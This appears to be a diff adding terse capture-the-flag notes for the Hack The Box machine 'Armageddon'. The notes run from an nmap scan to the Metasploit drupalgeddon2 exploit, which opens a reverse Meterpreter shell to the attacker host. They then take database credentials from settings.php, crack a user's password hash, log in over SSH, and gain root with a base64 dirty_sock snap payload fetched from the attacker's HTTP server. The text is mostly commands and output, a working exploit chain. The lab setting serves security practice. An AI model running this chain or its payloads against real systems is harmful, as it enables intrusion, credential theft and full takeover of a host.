@@ -1,0 +1,354 @@
+---------
+Armageddon
+---------
+
+sudo nmap 10.129.48.89 -sCVS -p- --min-rate 10000 -A
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11
+Network Distance: 2 hops
+
+TRACEROUTE (using port 199/tcp)
+HOP RTT     ADDRESS
+1   7.78 ms 10.10.14.1
+2   8.15 ms 10.129.48.89
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds
+--------------------------------------------------------------------------------------------------------
+
+echo 10.129.48.89 armageddon.htb | sudo tee -a /etc/hosts
+10.129.48.89 armageddon.htb
+--------------------------------------------------------------------------------------------------------
+
+curl -i http://armageddon.htb/robots.txt
+
+HTTP/1.1 200 OK
+Date: Thu, 19 Nov 2026 09:08:02 GMT
+Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+Last-Modified: Wed, 21 Jun 2017 18:20:18 GMT
+ETag: "88d-5527c6b967c80"
+Accept-Ranges: bytes
+Content-Length: 2189
+Content-Type: text/plain; charset=UTF-8
+
+#
+# robots.txt
+#
+# This file is to prevent the crawling and indexing of certain parts
+# of your site by web crawlers and spiders run by sites like Yahoo!
+# and Google. By telling these "robots" where not to go on your site,
+# you save bandwidth and server resources.
+#
+# This file will be ignored unless it is at the root of your host:
+# Used:    http://example.com/robots.txt
+# Ignored: http://example.com/site/robots.txt
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/robotstxt.html
+
+User-agent: *
+Crawl-delay: 10
+# CSS, JS, Images
+Allow: /misc/*.css$
+Allow: /misc/*.css?
+Allow: /misc/*.js$
+Allow: /misc/*.js?
+Allow: /misc/*.gif
+Allow: /misc/*.jpg
+Allow: /misc/*.jpeg
+Allow: /misc/*.png
+Allow: /modules/*.css$
+Allow: /modules/*.css?
+Allow: /modules/*.js$
+Allow: /modules/*.js?
+Allow: /modules/*.gif
+Allow: /modules/*.jpg
+Allow: /modules/*.jpeg
+Allow: /modules/*.png
+Allow: /profiles/*.css$
+Allow: /profiles/*.css?
+Allow: /profiles/*.js$
+Allow: /profiles/*.js?
+Allow: /profiles/*.gif
+Allow: /profiles/*.jpg
+Allow: /profiles/*.jpeg
+Allow: /profiles/*.png
+Allow: /themes/*.css$
+Allow: /themes/*.css?
+Allow: /themes/*.js$
+Allow: /themes/*.js?
+Allow: /themes/*.gif
+Allow: /themes/*.jpg
+Allow: /themes/*.jpeg
+Allow: /themes/*.png
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+--------------------------------------------------------------------------------------------------------
+
+msfconsole
+---
+
+[msf](Jobs:0 Agents:0) >> search drupalgeddon2
+
+Matching Modules
+================
+
+   #   Name                                      Disclosure Date  Rank       Check  Description
+   -   ----                                      ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+   1     \_ target: Automatic (PHP In-Memory)    .                .          .      .
+   2     \_ target: Automatic (PHP Dropper)      .                .          .      .
+   3     \_ target: Automatic (Unix In-Memory)   .                .          .      .
+   4     \_ target: Automatic (Linux Dropper)    .                .          .      .
+   5     \_ target: Drupal 7.x (PHP In-Memory)   .                .          .      .
+   6     \_ target: Drupal 7.x (PHP Dropper)     .                .          .      .
+   7     \_ target: Drupal 7.x (Unix In-Memory)  .                .          .      .
+   8     \_ target: Drupal 7.x (Linux Dropper)   .                .          .      .
+   9     \_ target: Drupal 8.x (PHP In-Memory)   .                .          .      .
+   10    \_ target: Drupal 8.x (PHP Dropper)     .                .          .      .
+   11    \_ target: Drupal 8.x (Unix In-Memory)  .                .          .      .
+   12    \_ target: Drupal 8.x (Linux Dropper)   .                .          .      .
+   13    \_ AKA: SA-CORE-2018-002                .                .          .      .
+   14    \_ AKA: Drupalgeddon 2                  .                .          .      .
+
+---
+
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> set RHOSTS 10.129.48.89
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> set LHOST 10.10.14.39
+[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> run
+[*] Started reverse TCP handler on 10.10.14.39:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Sending stage (42137 bytes) to 10.129.48.89
+[*] Meterpreter session 1 opened (10.10.14.39:4444 -> 10.129.48.89:38072) at 2026-11-19 04:37:48 -0500
+---
+(Meterpreter 1)(/var/www/html) > shell
+Process 3136 created.
+Channel 0 created.
+
+id
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+whoami
+apache
+---
+
+ss -ltnp
+
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
+LISTEN     0      0            *:22                       *:*
+LISTEN     0      0      127.0.0.1:25                       *:*
+LISTEN     0      0      127.0.0.1:3306                     *:*
+...
+---
+
+cat sites/default/settings.php
+
+$databases = array (
+  'default' =>
+  array (
+    'default' =>
+    array (
+      'database' => 'drupal',
+      'username' => 'drupaluser',
+      'password' => 'CQHEy@9M*m23gBVj',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+username: drupaluser
+password: CQHEy@9M*m23gBVj
+----
+
+cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+...
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+---
+
+mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases;"
+
+Database
+information_schema
+drupal
+mysql
+performance_schema
+---
+
+mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; show tables;"
+Tables_in_drupal
+...
+users
+...
+---
+
+mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; select name, pass, mail from users;"
+name	            pass	                                                mail
+brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu
+
+---
+
+echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash
+---
+
+hashid '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
+Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
+[+] Drupal > v7.x
+---
+
+hashcat -m 7900 -a 0 -o result hash rockyou.txt --force
+---
+
+cat result
+
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
+---
+
+username: brucetherealadmin
+password: booboo
+---
+
+ssh brucetherealadmin@armageddon.htb
+---
+
+[brucetherealadmin@armageddon ~]$ cat user.txt
+122b806e9702790cc5369b597c2825bf
+--------------------------------------------------------------------------------------------------------
+
+sudo -l
+Matching Defaults entries for brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+--------------------------------------------------------------------------------------------------------
+
+create custom snap instance
+https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
+FAIL:NOT BUILT IT
+--------------------------------------------------------------------------------------------------------
+
+SEE REPO: https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
+
+python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAA
+AAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2g
+KCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5
+R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT
+2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvIC
+JkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHk
+tc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRl
+c2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJ
+wphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP
+03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+l
+gZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCc
+Vtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAv
+hLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZec
+TuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAA
+AAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAE
+gAAAAACAAw" + "A" * 4256 + "=="' | base64 -d > snap.snap
+----
+
+upload file to server:
+python3 -m http.server 9999
+
+from server:
+curl -fL http://10.10.14.39:9999/snap.snap -o .
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to create the file .: Is a directory
+100  4096  100  4096    0     0   207k      0 --:--:-- --:--:-- --:--:--  210k
+curl: (23) Failed writing body (0 != 4096)
+--------------------------------------------------------------------------------------------------------
+
+sudo /usr/bin/snap install --devmode snap.snap
+dirty-sock 0.1 installed
+--------------------------------------------------------------------------------------------------------
+
+su dirty_sock
+---
+
+[dirty_sock@armageddon dirty_snap]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for dirty_sock:
+Matching Defaults entries for dirty_sock on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
+    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User dirty_sock may run the following commands on armageddon:
+    (ALL : ALL) ALL
+---
+
+[dirty_sock@armageddon dirty_snap]$ sudo cat /root/root.txt
+ba40926b81cfaa44bdbad78f1854e32f
+
